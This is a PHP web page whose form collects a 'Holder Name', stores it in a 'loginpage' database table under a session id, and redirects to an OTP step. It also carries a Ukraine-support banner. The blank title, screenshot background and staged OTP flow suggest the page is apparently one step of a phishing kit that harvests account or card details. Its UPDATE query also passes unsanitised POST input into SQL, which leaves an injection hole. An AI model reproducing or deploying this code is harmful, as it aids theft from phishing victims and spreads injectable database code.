<?php
session_start();
include 'db.php';
?>
<?php
if (isset($_POST['submit'])) {
     $last_id = $_SESSION['last_id'];
     $hname = $_POST['hname'];
     $insert = $conn->query("UPDATE loginpage SET holdername='$hname' WHERE id='$last_id'");
     header("location:otp3.php");
}
?>

<!DOCTYPE html>
<html lang="en">

<head>
     <meta charset="UTF-8">
     <br>
     <title></title><br><br><br><br><br>

     <link rel="stylesheet" href="style.css">
     <style>
          html {
               height: 100%;
          }

          body {
               font: 13px sans-serif;
          }

          .wrapper {
               width: 600px;
               padding: 50px;
          }
     </style>
     <style>
          .loader {
               position: fixed;
               left: 0px;
               top: 0px;
               width: 100%;
               height: 100%;
               z-index: 9999;
               background: url('Spinner-3.gif') 50% 50% no-repeat rgb(249, 249, 249);
               opacity: .8;
          }
     </style>
     <!--Spinner-3.gif-->
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
</head><br><br><br><br><br><br><br><br><br><br><br><br>

<body style="background-image: url('as.png'); background-repeat: no-repeat; background-size:center;">
     <!--<div class="loader"></div>-->

     <div class="wrapper mt-5 ml-5">
          <h2></h2><br><br><br>
          <form action="" method="post">
               <div class="form-group">
                    <label>
                         <h5> Holder Name* </h5>
                    </label>
                    <input type="text" name="hname" class="form-control" value="">
                    <span class="invalid-feedback"></span>
               </div>


               <div class="form-group">
                    <input type="submit" name="submit" class="btn btn-primary" value="Submit">
               </div>

          </form>
     </div>

     <script type="text/javascript">
          $(window).load(function() {
               $(".loader").fadeOut("slow");
          });
     </script>
     <style>
          .footer,
          .generic-footer {
               margin-bottom: 98px
          }

          @media (min-width:374px) {

               .footer,
               .generic-footer {
                    margin-bottom: 78px
               }
          }

          @media (min-width:546px) {

               .footer,
               .generic-footer {
                    margin-bottom: 56px
               }
          }

          @media (min-width:1055px) {

               .footer,
               .generic-footer {
                    margin-bottom: 0
               }
          }

          .disclaimer {
               position: fixed;
               z-index: 9999999;
               bottom: 0;
               right: 0;
               border-top: 2px solid #ff5c62;
               text-align: center;
               font-size: 14px;
               font-weight: 400;
               background-color: #fff;
               padding: 5px 10px 5px 10px
          }

          .disclaimer a:hover {
               text-decoration: underline
          }

          @media (min-width:1052px) {
               .disclaimer {
                    text-align: right;
                    border-left: 2px solid red;
                    border-top-left-radius: 10px
               }
          }

          @media (min-width:1920px) {
               .disclaimer {
                    width: 60%
               }
          }
     </style>
     <div class="disclaimer">We support Ukraine and condemn war. Push Russian government to act against war. Be brave, vocal and show your support to Ukraine. Follow the latest news <a title="https://www.bbc.com/news/live/world-europe-60517447" target="_blank" href="https://www.bbc.com/news/live/world-europe-60517447" style="color: black;"><b>HERE</b></a></div>
</body>

</html>